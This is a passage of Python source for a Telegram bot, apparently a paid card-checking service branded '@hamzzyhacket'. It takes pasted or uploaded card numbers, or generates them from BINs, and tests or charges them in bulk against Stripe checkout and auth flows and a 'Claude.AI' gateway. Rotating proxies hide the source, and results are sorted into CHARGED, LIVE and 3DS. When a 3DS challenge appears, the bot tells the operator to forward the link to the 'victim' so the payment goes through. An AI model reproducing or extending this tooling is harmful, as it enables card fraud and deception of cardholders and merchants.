            bot.reply_to(message, f"❌ Error: {str(e)}")
    else:
        proxy_text = message.text.strip()
        success, ptype = add_proxy_from_text(proxy_text)
        
        if success:
            bot.reply_to(message, f"✅ Proxy added to {ptype.upper()} list!")
        else:
            bot.reply_to(message, "❌ Invalid proxy format.")

@bot.message_handler(commands=['clear_data'])
def clear_data_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    bot.reply_to(message, "⚠️ **WARNING:** This will clear ALL data (users, keys, stats, results).\n\nType `/confirm_clear` to confirm.", parse_mode="Markdown")

@bot.message_handler(commands=['confirm_clear'])
def confirm_clear_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    global users, keys, stats
    
    # Clear data
    users = {}
    keys = {}
    stats = {
        "total_checks": 0,
        "charged": 0,
        "live": 0,
        "approved": 0,
        "three_ds": 0,
        "declined": 0,
        "error": 0
    }
    
    # Clear files
    for f in [USERS_FILE, KEYS_FILE, STATS_FILE, BANNED_FILE, CHARGED_FILE, LIVE_FILE, THREEDS_FILE, DECLINED_FILE, ERROR_FILE, APPROVED_FILE]:
        if os.path.exists(f):
            os.remove(f)
    
    save_users()
    save_keys()
    save_stats()
    
    bot.reply_to(message, "✅ All data cleared successfully!")

@bot.message_handler(commands=['restart'])
def restart_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    bot.reply_to(message, "🔄 Restarting bot...")
    
    # Save all data
    save_users()
    save_keys()
    save_stats()
    
    # Restart
    os.execv(sys.executable, [sys.executable] + sys.argv)

@bot.message_handler(commands=['myid'])
def myid_command(message):
    user_id = message.from_user.id
    is_adm = is_admin(user_id)
    
    response = f"""
╔══════════════════════════════════════╗
║           🆔 YOUR ID INFO            ║
╠══════════════════════════════════════╣
║  Your Telegram ID: `{user_id}`
║  Admin ID in code: `{ADMIN_ID}`
║  Are you Admin? {is_adm}
╠══════════════════════════════════════╣
║  💡 If not admin, change ADMIN_ID in
║     the code to your ID and redeploy
╠══════════════════════════════════════╣
║  👑 @hamzzyhacket
╚══════════════════════════════════════╝
"""
    bot.reply_to(message, response, parse_mode="Markdown")

# ==================== GATEWAY HANDLER ====================

def handle_gateway(message, user_id, session):
    choice = message.text.strip()
    
    if choice == "💳 STRIPE CHECKOUT":
        session["gateway"] = "stripe_checkout"
        session["step"] = "proxy"
        saved_proxy = get_user_proxy(user_id)
        if saved_proxy:
            session["proxy"] = saved_proxy
            bot.reply_to(message, f"🔄 Using saved proxy: {saved_proxy.get('type', 'unknown').upper()}")
            session["step"] = "method"
            bot.reply_to(message, "📌 **SELECT METHOD**\n\nChoose CC or BIN method:", reply_markup=get_method_keyboard(), parse_mode="Markdown")
        else:
            bot.reply_to(message, "⚙️ **PROXY SETUP**\n\nDo you want to use a proxy?", reply_markup=get_proxy_keyboard(), parse_mode="Markdown")
    
    elif choice == "🏦 STRIPE AUTH":
        session["gateway"] = "stripe_auth"
        session["step"] = "proxy"
        saved_proxy = get_user_proxy(user_id)
        if saved_proxy:
            session["proxy"] = saved_proxy
            bot.reply_to(message, f"🔄 Using saved proxy: {saved_proxy.get('type', 'unknown').upper()}")
            session["step"] = "method"
            bot.reply_to(message, "📌 **SELECT METHOD**\n\nChoose CC or BIN method:", reply_markup=get_method_keyboard(), parse_mode="Markdown")
        else:
            bot.reply_to(message, "⚙️ **PROXY SETUP**\n\nDo you want to use a proxy?", reply_markup=get_proxy_keyboard(), parse_mode="Markdown")
    
    elif choice == "🤖 CLAUDE.AI":
        session["gateway"] = "claude"
        session["step"] = "proxy"
        saved_proxy = get_user_proxy(user_id)
        if saved_proxy:
            session["proxy"] = saved_proxy
            bot.reply_to(message, f"🔄 Using saved proxy: {saved_proxy.get('type', 'unknown').upper()}")
            session["step"] = "method"
            bot.reply_to(message, "📌 **SELECT METHOD**\n\nChoose CC or BIN method:", reply_markup=get_method_keyboard(), parse_mode="Markdown")
        else:
            bot.reply_to(message, "⚙️ **PROXY SETUP**\n\nDo you want to use a proxy?", reply_markup=get_proxy_keyboard(), parse_mode="Markdown")
    
    elif choice == "🔙 BACK":
        session["step"] = "start"
        clear_session(user_id)
        bot.reply_to(message, "Returned to main menu.", reply_markup=get_main_keyboard())
    
    else:
        bot.reply_to(message, "❌ Invalid choice. Select a gateway:", reply_markup=get_gateway_keyboard())
        bot.register_next_step_handler(message, handle_gateway, user_id, session)

# ==================== PROXY HANDLER ====================

def handle_proxy_choice(message, user_id, session):
    choice = message.text.strip()
    
    if choice == "🌐 HTTP PROXY":
        proxy = get_proxy_by_type("http")
        if proxy:
            session["proxy"] = proxy
            save_user_proxy(user_id, proxy)
            bot.reply_to(message, f"✅ Using HTTP proxy: {proxy.get('url', 'N/A')[:50]}...")
        else:
            bot.reply_to(message, "⚠️ No HTTP proxies available. Continuing without proxy.")
            session["proxy"] = None
            clear_user_proxy(user_id)
        session["step"] = "method"
        bot.reply_to(message, "📌 **SELECT METHOD**\n\nChoose CC or BIN method:", reply_markup=get_method_keyboard(), parse_mode="Markdown")
    
    elif choice == "🔒 SOCKS5 PROXY":
        proxy = get_proxy_by_type("socks5")
        if proxy:
            session["proxy"] = proxy
            save_user_proxy(user_id, proxy)
            bot.reply_to(message, f"✅ Using SOCKS5 proxy: {proxy.get('url', 'N/A')[:50]}...")
        else:
            bot.reply_to(message, "⚠️ No SOCKS5 proxies available. Continuing without proxy.")
            session["proxy"] = None
            clear_user_proxy(user_id)
        session["step"] = "method"
        bot.reply_to(message, "📌 **SELECT METHOD**", reply_markup=get_method_keyboard(), parse_mode="Markdown")
    
    elif choice == "🔒 SOCKS4 PROXY":
        proxy = get_proxy_by_type("socks4")
        if proxy:
            session["proxy"] = proxy
            save_user_proxy(user_id, proxy)
            bot.reply_to(message, f"✅ Using SOCKS4 proxy: {proxy.get('url', 'N/A')[:50]}...")
        else:
            bot.reply_to(message, "⚠️ No SOCKS4 proxies available. Continuing without proxy.")
            session["proxy"] = None
            clear_user_proxy(user_id)
        session["step"] = "method"
        bot.reply_to(message, "📌 **SELECT METHOD**", reply_markup=get_method_keyboard(), parse_mode="Markdown")
    
    elif choice == "🏠 RESIDENTIAL PROXY":
        proxy = get_proxy_by_type("residential")
        if proxy:
            session["proxy"] = proxy
            save_user_proxy(user_id, proxy)
            bot.reply_to(message, f"✅ Using Residential proxy: {proxy.get('url', 'N/A')[:50]}...")
        else:
            bot.reply_to(message, "⚠️ No Residential proxies available. Continuing without proxy.")
            session["proxy"] = None
            clear_user_proxy(user_id)
        session["step"] = "method"
        bot.reply_to(message, "📌 **SELECT METHOD**", reply_markup=get_method_keyboard(), parse_mode="Markdown")
    
    elif choice == "🔄 ANY PROXY":
        proxy = get_any_proxy()
        if proxy:
            session["proxy"] = proxy
            save_user_proxy(user_id, proxy)
            bot.reply_to(message, f"✅ Using {proxy['type'].upper()} proxy: {proxy.get('url', 'N/A')[:50]}...")
        else:
            bot.reply_to(message, "⚠️ No proxies available. Continuing without proxy.")
            session["proxy"] = None
            clear_user_proxy(user_id)
        session["step"] = "method"
        bot.reply_to(message, "📌 **SELECT METHOD**", reply_markup=get_method_keyboard(), parse_mode="Markdown")
    
    elif choice == "🔄 AUTO ROTATE":
        session["proxy"] = "auto_rotate"
        save_user_proxy(user_id, {"type": "auto_rotate"})
        bot.reply_to(message, "✅ Auto-rotate proxy mode enabled. Bot will try different proxies on failure.")
        session["step"] = "method"
        bot.reply_to(message, "📌 **SELECT METHOD**", reply_markup=get_method_keyboard(), parse_mode="Markdown")
    
    elif choice == "📁 LOAD PROXY FILE":
        session["step"] = "waiting_proxy_file"
        bot.reply_to(message, "📁 **UPLOAD PROXY FILE**\n\nSend a .txt file with proxies (one per line).", parse_mode="Markdown")
        return
    
    elif choice == "📝 ADD SINGLE PROXY":
        session["step"] = "waiting_single_proxy"
        bot.reply_to(message, "📝 **ENTER PROXY**\n\nSend a single proxy in any format:", parse_mode="Markdown")
        return
    
    elif choice == "⏩ NO PROXY":
        session["proxy"] = None
        clear_user_proxy(user_id)
        session["step"] = "method"
        bot.reply_to(message, "⏩ No proxy will be used.")
        bot.reply_to(message, "📌 **SELECT METHOD**\n\nChoose CC or BIN method:", reply_markup=get_method_keyboard(), parse_mode="Markdown")
    
    elif choice == "🔙 BACK":
        session["step"] = "gateway"
        bot.reply_to(message, "📌 **SELECT GATEWAY**", reply_markup=get_gateway_keyboard(), parse_mode="Markdown")
    
    else:
        bot.reply_to(message, "❌ Invalid choice.", reply_markup=get_proxy_keyboard())
        bot.register_next_step_handler(message, handle_proxy_choice, user_id, session)

def handle_waiting_proxy_file(message, user_id, session):
    if not message.document:
        bot.reply_to(message, "❌ Please send a .txt file.", reply_markup=get_proxy_keyboard())
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_content = downloaded_file.decode('utf-8', errors='ignore')
        
        count = 0
        for line in file_content.splitlines():
            line = line.strip()
            if line and not line.startswith('#'):
                success, ptype = add_proxy_from_text(line)
                if success:
                    count += 1
        
        bot.reply_to(message, f"✅ Loaded {count} proxies from file!")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
    
    session["step"] = "proxy"
    bot.reply_to(message, "⚙️ **PROXY SETUP**\n\nChoose proxy option:", reply_markup=get_proxy_keyboard(), parse_mode="Markdown")

def handle_waiting_single_proxy(message, user_id, session):
    proxy_text = message.text.strip()
    success, ptype = add_proxy_from_text(proxy_text)
    
    if success:
        bot.reply_to(message, f"✅ Proxy added to {ptype.upper()} list!")
    else:
        bot.reply_to(message, "❌ Invalid proxy format.")
    
    session["step"] = "proxy"
    bot.reply_to(message, "⚙️ **PROXY SETUP**\n\nChoose proxy option:", reply_markup=get_proxy_keyboard(), parse_mode="Markdown")

# ==================== METHOD HANDLER ====================

def handle_method(message, user_id, session):
    choice = message.text.strip()
    
    if choice == "💳 CC METHOD" or choice == "CC METHOD":
        session["method"] = "cc"
        session["step"] = "check_type"
        bot.reply_to(message, "📌 **CHECK TYPE**\n\nChoose single or mass check:", reply_markup=get_check_type_keyboard(), parse_mode="Markdown")
    
    elif choice == "🔢 BIN METHOD" or choice == "BIN METHOD":
        session["method"] = "bin"
        session["step"] = "bin_input"
        bot.reply_to(message, "🔢 **ENTER BIN**\n\nEnter BIN (e.g., `414720`) or BIN with format (e.g., `414720x|xx|xx|xxx`):\n\n`x` = random digit", parse_mode="Markdown")
        bot.register_next_step_handler(message, handle_bin_input, user_id, session)
    
    elif choice == "🔙 BACK":
        session["step"] = "proxy"
        bot.reply_to(message, "⚙️ **PROXY SETUP**", reply_markup=get_proxy_keyboard(), parse_mode="Markdown")
    
    else:
        bot.reply_to(message, "❌ Invalid choice.", reply_markup=get_method_keyboard())
        bot.register_next_step_handler(message, handle_method, user_id, session)

# ==================== CHECK TYPE HANDLER ====================

def handle_check_type(message, user_id, session):
    choice = message.text.strip()
    
    if choice == "📄 SINGLE" or choice == "SINGLE":
        session["check_type"] = "single"
        session["step"] = "card_input"
        
        if session["gateway"] == "stripe_checkout":
            bot.reply_to(message, "💳 **ENTER CARD & CHECKOUT URL**\n\nFirst send the card, then the checkout URL.\n\nCard format: `CC|MM|YY|CVV`\nExample: `4147201234567890|12|28|123`", parse_mode="Markdown")
            bot.register_next_step_handler(message, handle_card_input, user_id, session)
        else:
            bot.reply_to(message, "💳 **ENTER CARD**\n\nFormat: `CC|MM|YY|CVV`\nExample: `4147201234567890|12|28|123`", parse_mode="Markdown")
            bot.register_next_step_handler(message, handle_card_input, user_id, session)
    
    elif choice == "📁 MASS" or choice == "MASS":
        session["check_type"] = "mass"
        session["step"] = "file_upload"
        
        bot.reply_to(message, "📁 **UPLOAD CARD FILE**\n\nUpload a `.txt` file with one card per line.\n\nFormat: `CC|MM|YY|CVV` per line\n\nAfter upload, use `/mchk` to start checking.", parse_mode="Markdown")
    
    elif choice == "🔙 BACK":
        session["step"] = "method"
        bot.reply_to(message, "📌 **SELECT METHOD**", reply_markup=get_method_keyboard(), parse_mode="Markdown")
    
    else:
        bot.reply_to(message, "❌ Invalid choice.", reply_markup=get_check_type_keyboard())
        bot.register_next_step_handler(message, handle_check_type, user_id, session)

def handle_card_input(message, user_id, session):
    card_input = message.text.strip()
    
    parts = card_input.replace(" ", "").split("|")
    if len(parts) != 4:
        bot.reply_to(message, "❌ **INVALID FORMAT!**\n\nUse: `CC|MM|YY|CVV`", parse_mode="Markdown")
        bot.register_next_step_handler(message, handle_card_input, user_id, session)
        return
    
    card = {
        "cc": parts[0].strip(),
        "month": parts[1].strip().zfill(2),
        "year": parts[2].strip(),
        "cvv": parts[3].strip(),
        "full": f"{parts[0]}|{parts[1].zfill(2)}|{parts[2][-2:]}|{parts[3]}"
    }
    
    session["cards"] = [card]
    
    if session["gateway"] == "stripe_checkout":
        session["step"] = "checkout_url"
        bot.reply_to(message, "🔗 **ENTER CHECKOUT URL**\n\nPaste the Stripe checkout URL:\n\nExample: `https://pay.krea.ai/c/pay/cs_live_xxx#...`", parse_mode="Markdown")
        bot.register_next_step_handler(message, handle_checkout_url, user_id, session)
    else:
        start_checking(message, user_id, session)

def handle_checkout_url(message, user_id, session):
    checkout_url = message.text.strip()
    
    if not checkout_url.startswith("http"):
        checkout_url = "https://" + checkout_url
    
    if "/c/pay/cs_" not in checkout_url:
        bot.reply_to(message, "❌ **INVALID CHECKOUT URL!**\n\nURL must contain `/c/pay/cs_` pattern.\n\nExample: `https://pay.krea.ai/c/pay/cs_live_xxx#...`", parse_mode="Markdown")
        bot.register_next_step_handler(message, handle_checkout_url, user_id, session)
        return
    
    session["checkout_url"] = checkout_url
    start_checking(message, user_id, session)

def handle_bin_input(message, user_id, session):
    bin_input = message.text.strip()
    
    if bin_input == "🔙 BACK":
        session["step"] = "method"
        bot.reply_to(message, "📌 **SELECT METHOD**", reply_markup=get_method_keyboard(), parse_mode="Markdown")
        return
    
    session["bin"] = bin_input
    session["step"] = "bin_amount"
    bot.reply_to(message, "🔢 **HOW MANY CARDS?**\n\nEnter number of cards to generate (1-100):", parse_mode="Markdown")
    bot.register_next_step_handler(message, handle_bin_amount, user_id, session)

def handle_bin_amount(message, user_id, session):
    try:
        amount = int(message.text.strip())
        if amount < 1:
            amount = 1
        if amount > 100:
            amount = 100
            bot.reply_to(message, "⚠️ Max 100 cards. Generating 100.")
    except:
        amount = 10
        bot.reply_to(message, "⚠️ Invalid number. Generating 10 cards.")
    
    session["amount"] = amount
    
    cards = []
    bin_pattern = session["bin"]
    for i in range(amount):
        card = generate_card(bin_pattern)
        cards.append(card)
    
    session["cards"] = cards
    
    # Show BIN info
    bin_info = get_bin_info(bin_pattern[:6])
    bot.reply_to(message, f"🔍 **BIN INFO:** {bin_info['brand']} | {bin_info['type']} | {bin_info['bank']} | {bin_info['country']}")
    
    preview = "\n".join([c["full"] for c in cards[:10]])
    if len(cards) > 10:
        preview += f"\n... and {len(cards) - 10} more"
    
    bot.reply_to(message, f"✅ **{len(cards)} CARDS GENERATED!**\n\n```\n{preview}\n```", parse_mode="Markdown")
    
    if session["gateway"] == "stripe_checkout":
        session["step"] = "checkout_url"
        bot.reply_to(message, "🔗 **ENTER CHECKOUT URL**\n\nPaste the Stripe checkout URL:", parse_mode="Markdown")
        bot.register_next_step_handler(message, handle_checkout_url, user_id, session)
    else:
        start_checking(message, user_id, session)

# ==================== CHECKING ENGINE ====================

def start_checking(message, user_id, session):
    cards = session.get("cards", [])
    proxy = session.get("proxy")
    gateway = session.get("gateway")
    checkout_url = session.get("checkout_url")
    check_type = session.get("check_type", "single")
    
    if not cards:
        bot.reply_to(message, "❌ No cards to check.")
        return
    
    # Check permissions
    if not is_admin(user_id) and not is_premium(user_id):
        checks_left = get_checks_left(user_id)
        if isinstance(checks_left, int) and len(cards) > checks_left:
            cards = cards[:checks_left]
            bot.reply_to(message, f"⚠️ Free users limited to {checks_left} cards. Checking first {checks_left}.")
    
    if check_type == "single":
        msg = bot.reply_to(message, "⏳ **CHECKING...**\n\nPlease wait...", parse_mode="Markdown")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            if gateway == "stripe_checkout":
                if proxy == "auto_rotate":
                    result = loop.run_until_complete(charge_with_proxy_rotation(cards[0], checkout_url))
                else:
                    result = loop.run_until_complete(stripe_checkout.charge(cards[0], checkout_url, proxy))
            elif gateway == "stripe_auth":
                result = loop.run_until_complete(stripe_auth.check_card(cards[0], proxy))
            elif gateway == "claude":
                result = loop.run_until_complete(claude_checker.check_card(cards[0], proxy))
            else:
                result = {"status": "ERROR", "message": "Unknown gateway", "amount": "N/A"}
        finally:
            loop.close()
        
        # Add check count for free users
        if not is_admin(user_id) and not is_premium(user_id):
            add_check_count(user_id)
        
        # Save result
        save_result(cards[0]["full"], result["status"], result.get("message", ""), result.get("amount", ""), gateway)
        
        # Format response
        if result["status"] == "CHARGED":
            emoji = "✅"
            status_text = "CHARGED"
        elif result["status"] == "APPROVED":
            emoji = "✅"
            status_text = "APPROVED"
        elif result["status"] == "LIVE":
            emoji = "💳"
            status_text = "LIVE"
        elif result["status"] == "3DS":
            emoji = "🔐"
            status_text = "3DS"
        else:
            emoji = "❌"
            status_text = "DECLINED"
        
        response = f"""
{emoji} **CARD RESULT**

╔══════════════════════════════════════╗
║  💳 Card: `{cards[0]['full']}`
║  🏦 Gateway: {gateway}
║  💵 Amount: {result.get('amount', 'N/A')}
╠══════════════════════════════════════╣
║  📌 STATUS: **{status_text}**
║  📝 Response: {result.get('message', '')}
╚══════════════════════════════════════╝
"""
        
        # Add BIN info
        bin_info = get_bin_info(cards[0]["cc"][:6])
        response += f"\n🔍 **BIN INFO:** {bin_info['brand']} | {bin_info['type']} | {bin_info['bank']} | {bin_info['country']}"
        response += f"\n\n👑 @hamzzyhacket"
        
        bot.edit_message_text(response, message.chat.id, msg.message_id, parse_mode="Markdown")
        
        # Handle 3DS
        if result["status"] == "3DS" and result.get("challenge_url"):
            job_id = f"3DS_{int(time.time())}_{user_id}"
            pending_3ds[job_id] = {
                "card": cards[0]["full"],
                "url": result["challenge_url"],
                "amount": result.get("amount", ""),
                "gateway": gateway,
                "user_id": user_id,
                "created": time.time()
            }
            bot.send_message(user_id, 
                             f"⚠️ **3DS DETECTED!**\n\n"
                             f"📌 Job ID: `{job_id}`\n"
                             f"💳 Card: {cards[0]['full']}\n"
                             f"💰 Amount: {result.get('amount', 'N/A')}\n\n"
                             f"**Forward to victim:**\n"
                             f"• Copy link: `/3ds_getlink {job_id}`\n"
                             f"• Send via Telegram: `/3ds_telegram {job_id} @username`\n\n"
                             f"Once victim completes, payment will go through.",
                             parse_mode="Markdown")
    
    else:  # mass check
        job_id = f"MASS_{int(time.time())}_{user_id}"
        mass_jobs[job_id] = {
            "user_id": user_id,
            "cards": cards,
            "gateway": gateway,
            "checkout_url": checkout_url,
            "proxy": proxy,
            "active": True,
            "current": 0,
            "total": len(cards),
            "start_time": time.time(),
            "message_id": None
        }
        
        mass_stats = {"charged": 0, "approved": 0, "live": 0, "three_ds": 0, "declined": 0, "error": 0}
        
        progress_text = f"""
╔══════════════════════════════════════╗
║           📊 MASS CHECK STARTED       ║
╠══════════════════════════════════════╣
║  📌 Job ID: {job_id}
║  🏦 Gateway: {gateway}
║  📈 Total Cards: {len(cards)}
║  🔄 Status: RUNNING
╠══════════════════════════════════════╣
║  ✅ CHARGED: 0
║  💳 LIVE/APPROVED: 0
║  🔐 3DS: 0
║  ❌ DECLINED: 0
╠══════════════════════════════════════╣
║  👑 @hamzzyhacket
╚══════════════════════════════════════╝
"""
        prog_msg = bot.reply_to(message, progress_text)
        mass_jobs[job_id]["message_id"] = prog_msg.message_id
        
        def process_mass():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            for idx, card in enumerate(cards):
                if not mass_jobs[job_id].get("active", True):
                    break
                
                mass_jobs[job_id]["current"] = idx + 1
                
                try:
                    if gateway == "stripe_checkout":
                        if proxy == "auto_rotate":
                            result = loop.run_until_complete(charge_with_proxy_rotation(card, checkout_url))
                        else:
                            result = loop.run_until_complete(stripe_checkout.charge(card, checkout_url, proxy))
                    elif gateway == "stripe_auth":
                        result = loop.run_until_complete(stripe_auth.check_card(card, proxy))
                    elif gateway == "claude":
                        result = loop.run_until_complete(claude_checker.check_card(card, proxy))
                    else:
                        result = {"status": "ERROR", "message": "Unknown gateway"}
                    
                    if result["status"] == "CHARGED":
                        mass_stats["charged"] += 1
                        save_result(card["full"], "CHARGED", result.get("message", ""), result.get("amount", ""), gateway)
                        bot.send_message(user_id, f"✅ **CHARGED:** {card['full']} | {result.get('amount', 'N/A')}")
                        
                    elif result["status"] == "APPROVED":
                        mass_stats["approved"] += 1
                        save_result(card["full"], "APPROVED", result.get("message", ""), result.get("amount", ""), gateway)
                        
                    elif result["status"] == "LIVE":
                        mass_stats["live"] += 1
                        save_result(card["full"], "LIVE", result.get("message", ""), result.get("amount", ""), gateway)
                        
                    elif result["status"] == "3DS":
                        mass_stats["three_ds"] += 1
                        save_result(card["full"], "3DS", result.get("message", ""), result.get("amount", ""), gateway)
                        
                        # Create 3DS job
                        job_3ds = f"3DS_{int(time.time())}_{user_id}_{idx}"
                        pending_3ds[job_3ds] = {
                            "card": card["full"],
                            "url": result.get("challenge_url", ""),
                            "amount": result.get("amount", ""),
                            "gateway": gateway,
                            "user_id": user_id,
                            "created": time.time()
                        }
                        if result.get("challenge_url"):
                            bot.send_message(user_id, f"⚠️ **3DS DETECTED** on card {idx+1}!\n📌 Job ID: `{job_3ds}`\nUse `/3ds_getlink {job_3ds}`")
                        
                    elif result["status"] == "DECLINED":
                        mass_stats["declined"] += 1
                    else:
                        mass_stats["error"] += 1
                    
                    if not is_admin(user_id) and not is_premium(user_id):
                        add_check_count(user_id)
                    
                except Exception as e:
                    mass_stats["error"] += 1
                
                # Update progress every 5 cards
                if (idx + 1) % 5 == 0 or (idx + 1) == len(cards):
                    percent = int(((idx + 1) / len(cards)) * 100)
                    bar_length = 20
                    filled = int(bar_length * percent / 100)
                    bar = '█' * filled + '░' * (bar_length - filled)
                    elapsed = time.time() - mass_jobs[job_id]["start_time"]
                    
                    progress_update = f"""
╔══════════════════════════════════════╗
║           📊 MASS CHECK PROGRESS      ║
╠══════════════════════════════════════╣
║  📌 Job ID: {job_id}
║  🔄 Status: RUNNING
║  📈 Progress: [{bar}] {percent}%
║  📍 Processed: {idx + 1}/{len(cards)}
╠══════════════════════════════════════╣
║  ✅ CHARGED: {mass_stats['charged']}
║  ✅ APPROVED: {mass_stats['approved']}
║  💳 LIVE: {mass_stats['live']}
║  🔐 3DS: {mass_stats['three_ds']}
║  ❌ DECLINED: {mass_stats['declined']}
║  ⚠️ ERROR: {mass_stats['error']}
╠══════════════════════════════════════╣
║  ⏱️ Time: {int(elapsed // 60)}m {int(elapsed % 60)}s
╠══════════════════════════════════════╣
║  👑 @hamzzyhacket
╚══════════════════════════════════════╝
"""
                    try:
                        bot.edit_message_text(progress_update, user_id, prog_msg.message_id)
                    except:
                        pass
                
                time.sleep(1)
            
            mass_jobs[job_id]["active"] = False
            
            elapsed = time.time() - mass_jobs[job_id]["start_time"]
            final_summary = f"""
╔══════════════════════════════════════╗
║           📊 MASS CHECK COMPLETE      ║
╠══════════════════════════════════════╣
║  📌 Job ID: {job_id}
║  🏦 Gateway: {gateway}
║  📈 Total Cards: {len(cards)}
║  ⏱️ Time: {int(elapsed // 60)}m {int(elapsed % 60)}s
╠══════════════════════════════════════╣
║  ✅ CHARGED: {mass_stats['charged']}
║  ✅ APPROVED: {mass_stats['approved']}
║  💳 LIVE: {mass_stats['live']}
║  🔐 3DS: {mass_stats['three_ds']}
║  ❌ DECLINED: {mass_stats['declined']}
║  ⚠️ ERROR: {mass_stats['error']}
╠══════════════════════════════════════╣
║  👑 @hamzzyhacket
╚══════════════════════════════════════╝
"""
            try:
                bot.edit_message_text(final_summary, user_id, prog_msg.message_id)
            except:
                pass
        
        threading.Thread(target=process_mass, daemon=True).start()

# ==================== ADMIN COMMANDS ====================

@bot.message_handler(commands=['addpremium'])
def addpremium_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Usage: /addpremium <user_id> <days>")
            return
        
        target_user = int(parts[1])
        days = int(parts[2])
        
        add_premium(target_user, days)
        bot.reply_to(message, f"✅ User {target_user} is now premium for {days} days")
        
        try:
            bot.send_message(target_user, f"✅ You have been granted PREMIUM access for {days} days!")
        except:
            pass
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['rmpremium'])
def rmpremium_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /rmpremium <user_id>")
            return
        
        target_user = int(parts[1])
        
        remove_premium(target_user)
        bot.reply_to(message, f"✅ User {target_user} premium removed")
        
        try:
            bot.send_message(target_user, f"❌ Your premium access has expired.")
        except:
            pass
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['genkey'])
def genkey_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    try:
        parts = message.text.split()
        days = int(parts[1]) if len(parts) > 1 else 30
        uses = int(parts[2]) if len(parts) > 2 else 1
        
        key = generate_key(days, uses)
        
        response = f"""
╔══════════════════════════════════════╗
║           🔑 KEY GENERATED           ║
╠══════════════════════════════════════╣
║  🔑 Key: `{key}`
║  📅 Duration: {days} days
║  🔄 Max Uses: {uses}
╠══════════════════════════════════════╣
║  👑 @hamzzyhacket
╚══════════════════════════════════════╝
"""
        bot.reply_to(message, response, parse_mode="Markdown")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['keys'])
def keys_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    if not keys:
        bot.reply_to(message, "ℹ️ No keys generated yet.")
        return
    
    response = "╔══════════════════════════════════════╗\n"
    response += "║           🔑 ALL KEYS               ║\n"
    response += "╠══════════════════════════════════════╣\n"
    
    for key, data in list(keys.items())[:20]:
        status = "✅ Active" if data.get("active", True) else "❌ Used"
        response += f"║  {key} - {data['duration']}d - {status}\n"
    
    response += "╠══════════════════════════════════════╣\n"
    response += "║  👑 @hamzzyhacket                    ║\n"
    response += "╚══════════════════════════════════════╝"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['stats'])
def admin_stats_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    proxy_count = sum(len(proxy_list[t]) for t in proxy_list)
    
    response = f"""
╔══════════════════════════════════════╗
║           📊 BOT STATISTICS          ║
╠══════════════════════════════════════╣
║  CHECK STATS:                       ║
║  📈 Total: {stats['total_checks']}
║  ✅ CHARGED: {stats['charged']}
║  ✅ APPROVED: {stats['approved']}
║  💳 LIVE: {stats['live']}
║  🔐 3DS: {stats['three_ds']}
║  ❌ DECLINED: {stats['declined']}
║  ⚠️ ERROR: {stats['error']}
╠══════════════════════════════════════╣
║  USER STATS:                        ║
║  👥 Total Users: {len(users)}
║  👑 Premium Users: {sum(1 for u in users.values() if u.get('premium', False))}
╠══════════════════════════════════════╣
║  KEY STATS:                         ║
║  🔑 Total Keys: {len(keys)}
║  ✅ Active Keys: {sum(1 for k in keys.values() if k.get('active', True))}
╠══════════════════════════════════════╣
║  PROXY STATS:                       ║
║  🌐 HTTP: {len(proxy_list['http'])}
║  🔒 SOCKS5: {len(proxy_list['socks5'])}
║  🔒 SOCKS4: {len(proxy_list['socks4'])}
║  🏠 RESIDENTIAL: {len(proxy_list['residential'])}
║  📊 Total: {proxy_count}
╠══════════════════════════════════════╣
║  👑 @hamzzyhacket
╚══════════════════════════════════════╝
"""
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin only.")
        return
    
    try:
        msg_text = message.text.replace('/broadcast ', '')
        if not msg_text or msg_text == '/broadcast':
            bot.reply_to(message, "❌ Usage: /broadcast <message>")
            return
        
        sent = 0
        for uid in users:
            try:
                bot.send_message(int(uid), f"📢 **BROADCAST**\n\n{msg_text}", parse_mode="Markdown")
                sent += 1
            except:
                pass
        
        bot.reply_to(message, f"✅ Broadcast sent to {sent} users")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== FILE HANDLER ====================

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    session = get_session(user_id)
    
    if session.get("step") == "waiting_proxy_file":
        handle_waiting_proxy_file(message, user_id, session)
        return
    
    if session.get("step") != "file_upload":
        bot.reply_to(message, "❌ Please use /check first to start a mass check session.")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_content = downloaded_file.decode('utf-8', errors='ignore')
        
        cards = []
        for line in file_content.splitlines():
            line = line.strip()
            if not line:
                continue
            
            parts = line.replace(" ", "").split("|")
            if len(parts) >= 4:
                card = {
                    "cc": parts[0].strip(),
                    "month": parts[1].strip().zfill(2),
                    "year": parts[2].strip(),
                    "cvv": parts[3].strip(),
                    "full": f"{parts[0]}|{parts[1].zfill(2)}|{parts[2][-2:]}|{parts[3]}"
                }
